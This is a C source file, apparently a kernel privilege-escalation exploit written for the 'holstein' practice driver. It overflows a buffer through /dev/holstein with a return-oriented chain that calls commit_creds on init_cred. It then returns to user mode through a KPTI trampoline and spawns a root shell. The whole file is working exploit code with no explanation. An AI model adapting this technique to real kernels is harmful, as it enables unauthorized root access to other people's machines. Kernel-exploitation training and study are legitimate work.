#include <fcntl.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define INFO(fmt, ...) fprintf(stderr, "[*] " fmt "\n", ##__VA_ARGS__)
#define WARN(fmt, ...) fprintf(stderr, "[!] " fmt "\n", ##__VA_ARGS__)
#define ERROR(msg) perror("[-] " msg)

// for saved states
uint64_t iter, user_cs, user_ss, user_rflags, user_rsp;

static void win()
{
    char* argv[] = { "/bin/sh", NULL };
    char* envp[] = { NULL };
    puts("[+] win!");
    execve("/bin/sh", argv, envp);
}

void save_state()
{
    __asm__(
        ".intel_syntax noprefix;"
        "mov %0, cs;"
        "mov %1, ss;"
        "mov %2, rsp;"
        "pushf;"
        "pop %3;"
        ".att_syntax prefix;"
        : "=r"(user_cs), "=r"(user_ss), "=r"(user_rsp), "=r"(user_rflags));

    INFO("Saved state");
}

#define POP_RDI 0xffffffff8127bbdc

#define PREPARE_KERNEL_CRED 0xffffffff8106e240
#define COMMIT_CREDS 0xffffffff8106e390
#define INIT_CRED 0xFFFFFFFF81E33500
#define KPTI_TRAMPOLINE 0xffffffff81800e26

int main()
{
    save_state();
    int fd = open("/dev/holstein", O_RDWR);
    if (fd == -1) {
        ERROR("open(\"/dev/holstein\")");
        exit(1);
    }

    const int BUF_SIZE = 0x510;

    char buf[BUF_SIZE] = {};
    memset(buf, 'a', 0x408);
    unsigned long *chain = (unsigned long *)&buf[0x408];
    *chain++ = POP_RDI;
    *chain++ = INIT_CRED;
    *chain++ = COMMIT_CREDS;
    // restore state
    *chain++ = KPTI_TRAMPOLINE;
    chain++;
    chain++;
    *chain++ = (unsigned long)&win;
    *chain++ = user_cs;
    *chain++ = user_rflags;
    *chain++ = user_rsp;
    *chain++ = user_ss;

    write(fd, buf, BUF_SIZE);

    close(fd);
    return 0;
}
